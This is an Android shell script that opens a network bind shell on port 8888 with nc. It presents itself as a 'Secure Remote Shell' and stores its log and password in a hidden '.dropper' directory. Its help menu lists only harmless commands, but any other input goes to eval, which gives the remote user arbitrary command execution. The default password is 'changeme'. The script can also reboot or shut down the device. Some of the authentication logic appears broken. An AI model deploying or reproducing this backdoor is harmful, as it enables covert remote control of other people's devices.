#!/system/bin/sh

PORT=8888
LOGFILE="/sdcard/Android/data/.dropper/tcp_server.log"
AUTHFILE="/sdcard/Android/data/.dropper/.auth_pass"
MAX_ATTEMPTS=3
SESSION_TIMEOUT=300

mkdir -p "$(dirname "$LOGFILE")"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"
}

send_banner() {
    echo "Welcome to Secure Remote Shell"
    echo "Type 'help' for available commands"
    echo "Session will timeout after $SESSION_TIMEOUT seconds of inactivity."
}

help_menu() {
    echo "Available commands:"
    echo "  help         Show this help menu"
    echo "  exit         Close the session"
    echo "  uptime       Show system uptime"
    echo "  whoami       Show current user"
    echo "  netstat      Show network connections"
    echo "  ps           List running processes"
    echo "  df           Disk usage"
    echo "  free         Memory usage"
    echo "  reboot       Reboot the device (requires root)"
    echo "  shutdown     Shutdown the device (requires root)"
}

check_auth() {
    read -t 30 -p "Password: " input_pass
    if [ ! -f "$AUTHFILE" ]; then
        echo "changeme" > "$AUTHFILE"
        chmod 600 "$AUTHFILE"
        log "Auth file created with default password 'changeme'"
    fi
    saved_pass=$(cat "$AUTHFILE")
    attempts=1
    while [ "$input_pass" != "$saved_pass" ] && [ $attempts -lt $MAX_ATTEMPTS ]; do
        echo "Incorrect password"
        log "Failed auth attempt #$attempts"
        attempts=$((attempts + 1))
        read -t 30 -p "Password: " input_pass
    done
    if [ "$input_pass" = "$saved_pass" ]; then
        echo "Authentication successful"
        log "Authentication successful"
        return 0
    fi
    echo "Too many failed attempts, disconnecting."
    log "Disconnected after too many failed auth attempts"
    return 1
}

session_loop() {
    send_banner
    while true; do
        echo -n "> "
        read -t $SESSION_TIMEOUT cmd
        if [ $? -gt 128 ]; then
            echo "Session timeout reached. Disconnecting."
            log "Session timeout"
            break
        fi
        case "$cmd" in
            help) help_menu ;;
            exit) echo "Goodbye!"; break ;;
            uptime) uptime ;;
            whoami) whoami ;;
            netstat) netstat ;;
            ps) ps ;;
            df) df ;;
            free) free ;;
            reboot) 
                if [ "$(id -u)" = "0" ]; then
                    echo "Rebooting device..."
                    reboot
                    break
                else
                    echo "Root required for reboot."
                fi
                ;;
            shutdown)
                if [ "$(id -u)" = "0" ]; then
                    echo "Shutting down device..."
                    poweroff
                    break
                else
                    echo "Root required for shutdown."
                fi
                ;;
            *) 
                if [ -n "$cmd" ]; then
                    eval "$cmd"
                fi
                ;;
        esac
    done
}

while true; do
    log "Waiting for connection on port $PORT..."

    FIFO=$(mktemp -u)
    mkfifo "$FIFO"

    (
        if check_auth; then
            session_loop <"$FIFO" 2>&1
        else
            echo "Authentication failed. Disconnecting."
        fi
    ) | nc -l -p "$PORT" >"$FIFO"
    STATUS=$?

    if [ $STATUS -ne 0 ]; then
        log "nc exited with status $STATUS"
    else
        log "Client disconnected normally"
    fi

    rm -f "$FIFO"
done
